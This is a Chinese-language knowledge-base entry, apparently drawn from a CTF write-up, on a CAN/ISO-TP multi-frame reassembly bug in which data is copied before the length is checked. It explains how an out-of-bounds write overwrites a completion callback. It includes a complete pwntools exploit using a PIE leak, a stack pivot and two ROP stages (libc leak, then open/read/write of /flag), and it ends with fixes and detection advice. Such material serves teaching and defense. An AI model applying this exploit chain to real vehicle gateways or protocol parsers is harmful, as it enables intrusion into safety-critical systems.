---
id: iot-protocol-can-isotp-reassembly-length-check-after-copy-overflow
title: CAN/ISO-TP 多帧重组“先拷贝后检查长度”：越界写覆盖完成回调指针并 ROP 读取 flag
type: scenario
domain: iot
path: iot/protocol
technique: can-isotp-reassembly-check-after-copy-callback-overflow
tags:
- iot
- can
- iso-tp
- iso-15765-2
- protocol-parser
- buffer-overflow
- callback-hijack
- rop
- seccomp
- automotive
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V203
  verified_at: '2026-11-07T02:17:09+08:00'
  notes: 已对照原文核对：SF/FF/CF 重组 memcpy 后检查长度、qword_6160 完成回调、日志泄露 handler-0x18c0 得 PIE、ROP1 puts/scanf/栈迁移、ROP2 open/read/write，与原文源码/exp 一致。未验证点：未本机复跑；原文无受影响版本；frontmatter 无 sources/source_url。
url: /docs/iot/protocol/iot-protocol-can-isotp-reassembly-length-check-after-copy-overflow/
draft: false
kb_aliases:
- ISO-TP 重组溢出
- CAN 多帧越界写
- 先 memcpy 后长度检查
- completion_callback 覆盖
- ISO 15765-2 解析漏洞
- 车载网关 ROP
- SF FF CF 重组
---

## 一句话结论

CAN 网关的 ISO-TP 重组代码在收到 FF/CF 帧时先把本帧数据 `memcpy` 到重组缓冲区，再检查“写入后长度是否超过 FF 声明的总长度”；检查发生得太晚，攻击者可用超长 CF 序列越界写穿缓冲区并覆盖其后的完成回调指针，再借日志泄露的 PIE 基址把回调改成栈迁移 gadget，最终在重组缓冲区上执行 ROP（禁用 execve 时用 open/read/write）读取 flag。

## 原理

- **ISO-TP 帧**：CAN 单帧最多 8 字节，长数据用 ISO 15765-2 分段：SF（Single Frame，PCI 高 4 位 0，低 4 位为长度 ≤7）、FF（First Frame，PCI1 高 4 位 1，与 PCI2 组成 12-bit 总长度）、CF（Consecutive Frame，PCI 高 4 位 2，低 4 位为 1..15 的序号）。接收端维护缓冲区、写入偏移和期望总长度，按序号拼接。
- **校验顺序错误**：重组函数先用 `memcpy(buf + offset, cf_data, n)` 写入当前帧 payload，然后才比较 `offset + n` 与 FF 声明的总长度。若当前帧超出声明长度，写入已经发生，越界数据被接受；后续帧还能继续写，形成任意长度的线性越界写。
- **控制数据布局**：全局重组缓冲区后紧邻着完成回调指针（如 `qword_6160`）等控制数据。越界写可以精确覆盖回调指针；当状态机认为传输完成并调用回调时，控制流被劫持。
- **地址泄露**：错误/日志函数会把处理函数地址（如 `handler=0x...`）打印出来；该地址减去固定偏移（如 `0x18c0`）即得 PIE 基址，解决 ASLR。
- **利用组织**：把 ROP1 放进 ISO-TP 缓冲区（攻击者完全可控），用越界写把回调指针改成 `leave; ret`/`pop rsp; ret` 类栈迁移 gadget；回调触发时 `rsp` 迁到缓冲区，ROP1 先 `puts(puts@got)` 泄露 libc，再用 `scanf("%s", buf+0x200)` 读入 ROP2，最后 `pop rsp; ret` 跳到 ROP2。
- **ROP2 与沙箱**：题目 seccomp 只禁 `execve`/`execveat`，因此用 `open("/flag")` + `read` + `write` 输出；若 `open` 也被禁，改 `openat(257)`。
- **为什么成立**：协议解析器把“长度”当作元数据而不是安全边界，写操作先于验证；全局缓冲区与回调指针同处一个可线性溢出的地址区间，一次越界即可同时控制数据流与控制流。

## 触发条件

- 目标实现 CAN/ISO-TP 多帧重组，且支持 FF/CF 拼接。
- 重组代码把当前帧数据写入缓冲区后才检查累计长度/序号，或检查使用有符号/截断的比较。
- 完成回调指针、状态标志等控制数据位于缓冲区之后，可被线性越界覆盖。
- 程序泄露代码地址（日志、错误信息）或 PIE 可绕过；存在可用的栈迁移 gadget。
- 目标沙箱允许 open/read/write 或 openat/read/write；能向目标发送任意 CAN 帧（SocketCAN、CAN 网关接口、题目 socket）。

## 利用步骤

1. 识别帧格式与认证：如先输入 magic number（案例 `12803159`）进入命令循环；帧文本格式为 `<can_id># <byte> ...`。
2. 触发一次正常 CF，观察日志中的 `handler=0x...` 泄露，减去已知偏移得到 PIE 基址；同时确认缓冲区地址 `buf = base + bss_offset`。
3. 计算越界偏移：从缓冲区起始到完成回调指针的距离；构造 FF 声明长度、CF 序号与 payload，使写入覆盖回调指针且不破坏必要的状态字段。
4. 在缓冲区中布置 ROP1：`pop rdi; puts@got; puts@plt; pop rdi; buf+0x98; pop rsi; buf+0x200; 0; scanf@plt; pop rsp; buf+0x200`，末尾用填充对齐。
5. 发送 FF + 多帧 CF；最后一帧覆盖回调指针为栈迁移 gadget（如 `leave; ret`、`pop rsp; ret`），触发回调后栈切换到缓冲区。
6. ROP1 泄露 libc 后，通过 `scanf("%s", ...)` 发送 ROP2：`open("/flag")`、`read(3, buf, 0x100)`、`write(1, buf, 0x100)`；如禁 open 用 `openat(AT_FDCWD, "/flag", 0)`。
7. 读取输出获得 flag；若失败，检查 CF 序号是否按 1..15 回绕、总长度是否与 FF 一致、越界是否覆盖了错误的字段。
8. 清理/记录后停止，不对真实车辆网络做未授权测试。

## PoC

```python
from pwn import *

context(arch="amd64", os="linux", log_level="info")
p = process("./pwn")
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

def send_frame(can_id, data):
    frame = f"{can_id:x}# " + " ".join(f"{b:02x}" for b in data)
    p.sendline(frame.encode())
    return p.recvuntil(b"> ", timeout=2)

p.recvuntil(b"Enter magic number:")
p.sendline(b"12803159")

# 1) 触发日志泄露 handler 地址
p.sendline(b"123# 21 41 41 41 41 41 41 41")
r = p.recvuntil(b"> ")
handle = int(r.split(b"handler=")[1].split()[0], 16)
elf.address = handle - 0x18c0
buf = elf.address + 0x6060

puts_plt = elf.address + 0x1160
puts_got = elf.address + 0x3f78
scanf_plt = elf.address + 0x11a0
pop_rdi = elf.address + 0x1557
pop_rsi = elf.address + 0x1555
pop_rsp_ret = elf.address + 0x12d4

# 2) ROP1：泄露 libc + 读 ROP2 + 栈迁移
rop1 = flat(
    pop_rdi, puts_got, puts_plt,
    pop_rdi, buf + 0x98,
    pop_rsi, buf + 0x200, 0,
    scanf_plt,
    pop_rsp_ret, buf + 0x200,
)
payload = rop1.ljust(0x98, b"A") + b"%512c\x00"
payload = payload.ljust(256, b"B") + p64(elf.address + 0x12d3) + b"\x00"

# 3) 按 ISO-TP FF/CF 发送
total = len(payload)
ff = [0x10 | ((total >> 8) & 0x0F), total & 0xFF] + list(payload[:6])
send_frame(0x4030, ff)
pos, seq = 6, 1
while pos < total:
    chunk = payload[pos:pos+7]
    cf = [0x20 | (seq & 0x0F)] + list(chunk)
    send_frame(0x4030, cf)
    pos += len(chunk); seq = seq % 15 + 1

# 4) 解析 libc 泄露并发送 ROP2（open/read/write）
leak = u64(p.recvuntil(b"\n", timeout=3).strip().ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]
rop2 = flat(
    libc.address + 0x10f78b, next(libc.search(b"/flag\x00")),
    libc.address + 0x110a7d, 0,
    libc.address + 0xb503c, 0, 0, 0, 0, 0,
    libc.address + 0xdd237, 2,          # open
    libc.address + 0x98fb6,
    libc.address + 0x10f78b, 3,
    libc.address + 0x110a7d, buf + 0x400,
    libc.address + 0xb503c, 0x100, 0, 0, 0, 0,
    libc.address + 0xdd237, 0,          # read
    libc.address + 0x98fb6,
    libc.address + 0x10f78b, 1,
    libc.address + 0x110a7d, buf + 0x400,
    libc.address + 0xb503c, 0x100, 0, 0, 0, 0,
    libc.address + 0xdd237, 1,          # write
    libc.address + 0x98fb6,
).ljust(512, b"D")
p.send(rop2)
print(p.recv(timeout=5))
```

```text
说明：偏移、bss 地址、gadget 与 libc 版本需按实际题目替换；
FF 的 12-bit 长度与实际发送字节数可以不一致——这正是越界写的来源。
```

## 变体与关联

- 变体：检查顺序可能是“先写后判断 `offset > declared_len`”“先写后判断序号合法性”“声明长度取 12-bit 但偏移用 16-bit”，均可用超长 FF/CF 触发。
- 变体：控制数据可能是函数指针表、状态机 vtable、canary 之前的元数据；越界写目标按内存布局调整。
- 变体：无日志泄露时可用格式化字符串、未初始化内存、错误消息等泄露 PIE；或直接 partial overwrite 回调指针到缓冲区附近。
- 变体：沙箱禁 open 时用 openat/openat2、sendfile、splice；禁 execve 时走 ORW。
- 关联：[[iot-protocol-can-arbitration-id-discovery-spoofing]]、[[iot-protocol-can-replay-candump-canplayer]]、[[iot-protocol-uds-routinecontrol-can-injection-takeover]]（CAN 协议基础与注入）、[[binary-pwn-stack-fake-rbp-check-seccomp-orw]]（seccomp ORW ROP）。

## 检测与防御

- 修复：在任何 `memcpy` 之前校验 `offset + n <= declared_len` 且 `offset + n <= sizeof(buf)`；对 12-bit 声明长度与累计写入量做一致性检查。
- 修复：CF 序号严格校验（1..15 循环、重复/乱序拒绝）；传输失败即清空状态与偏移。
- 加固：完成回调指针放在只读段/独立结构，使用函数指针完整性保护（CFI）；缓冲区与元数据之间加 guard 页/canary。
- 加固：seccomp 白名单覆盖 openat 等替代调用；ASLR/PIE/CET 提高利用成本。
- 检测：CAN 日志中出现声明长度与实际 CF 总量不一致、超长 CF 序列、异常 CAN ID 高频发送；网关进程崩溃/异常跳转到 bss。
